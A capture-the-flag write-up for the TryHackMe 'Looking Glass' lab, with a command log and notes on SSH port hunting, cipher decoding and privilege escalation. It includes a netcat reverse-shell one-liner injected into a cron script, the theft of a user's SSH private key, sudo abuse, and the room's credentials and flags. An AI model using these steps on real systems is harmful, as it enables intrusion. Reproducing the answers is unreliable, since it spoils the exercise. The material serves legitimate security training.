# Looking Glass - Medium

```shell
nmap -T4 -A 10.10.151.254

ssh 10.10.220.172 -p 11111

ssh -oHostKeyAlgorithms=+ssh-rsa 10.10.220.172 -p 11111
#lower

ssh -oHostKeyAlgorithms=+ssh-rsa 10.10.220.172 -p 12000
#higher

ssh -oHostKeyAlgorithms=+ssh-rsa 10.10.220.172 -p 11168
#this gives us a challenge
#decode poem, get secret to get creds

ssh jabberwock@10.10.220.172

sudo -l

cat /etc/crontab

ls -la

cat twasBrillig.sh

echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.14.31.212 5555 >/tmp/f' > twasBrillig.sh

#setup listener on attacker machine
nc -nvlp 5555

sudo /sbin/reboot

#in our listener, we get reverse shell
id
#tweedledum

ls -la

cat humptydumpty.txt
#crack hash
#no clue

sudo -l

sudo -u tweedledee /bin/bash

python3 -c 'import pty;pty.spawn("/bin/bash")'

cd /home/tweedledee

ls -la
#same files as tweedledum

su humptydumpty
#use password found by cracking last code from hex

cd /home/humptydumpty

ls -la

#use linpeas to check for privesc

ls /home
#alice directory has execute permissions

#get alice private key
cat /home/alice/.ssh/id_rsa

#in attacker machine
#copy private key
vim id_rsa

chmod 600 id_rsa

ssh alice@10.10.155.139 -i id_rsa

#using hint found in linpeas
cat /etc/sudoers.d/alice

sudo -h ssalg-gnikool /bin/bash
#root shell
```

* Port 22 is open, and multiple other ports have Dropbear sshd running on them.

* We can start by attempting to connect to some of the ports to check for clues.

* We have to add the flag for ```-oHostKeyAlgorithms=+ssh-rsa``` in order to make the connection work.

* Connecting to each port gives a response text - Higher or Lower - this could be related to the port number.

* After experimenting with the commands, and looking at the hint 'mirror', we can infer that Higher means Lower and Lower means Higher - this can be used to get the right port number.

* Eventually, on the right port, we find the service required and there is a challenge.

* The challenge is ciphertext; which seems like rotated text but can be actually cracked using online tools which crack Vignere ciphers automatically.

* Using online tools, we get the key 'thealphabetcipher'; this decodes the poem and gives us the secret "bewareTheJabberwock".

* When the secret is fed to the challenge on the required port, we get random creds jabberwock:CoveredPlungedFaintAssistance

* Using this, we can log into SSH on port 22.

* Now, the flag found is reversed, so we need to reverse it using online tools to get the actual flag.

* Now, for privesc, we can see that we are allowed to execute /sbin/reboot as root; furthermore, there is a cronjob scheduled which runs on reboot.

* The cronjob is run as tweedledum and it runs a script.

* The script prints out the poem on reboot; however, we have write permissions to the poem, so we can launch reverse shell by adding a one-liner to the script.

* After modifying the script, setting up listener and rebooting using sudo, we get reverse shell in two minutes.

* We get shell as tweedledum now.

* There's a file which contains a string; it seems to be a hash list.

* All the hashes except the last one can be cracked using online services, and the cracked ones say 'maybe one of these is the password'.

* We can attempt to crack the last hash using other online services, but we do not get anything.

* 'sudo -l' shows that we can run /bin/bash as tweedledee.

* We can do that to get shell as tweedledee, and check the files in their home directory, but we do not get anything of use.

* Looking at the humptydumpty.txt file again, the last hash when fed into CyberChef, can be cracked from hex to give us a password 'zyxwvutsrqponmlk'.

* We can use this password and attempt to login as humptydumpty, and we are able to.

* We can use linpeas for privesc but it does not give us anything useful except showing that /etc/sudoers.d/alice is readable.

* Checking for privesc, we can see /home directory permissions - /home/alice has execute permissions for all users.

* We can use this to get the private key for alice, and login as alice into SSH.

* From the previous hint given by linpeas.sh, we can read the sudoers file and see that alice can run bash as root on machine 'ssalg-gnikool', reverse for looking-glass, the hostname.

* Using 'sudo -h' for hostname, we can use that command to get root.

```markdown
1. Get the user flag - thm{65d3710e9d75d5f346d2bac669119a23}

2. Get the root flag - thm{bc2337b6f97d057b01da718ced6ead3f}
```
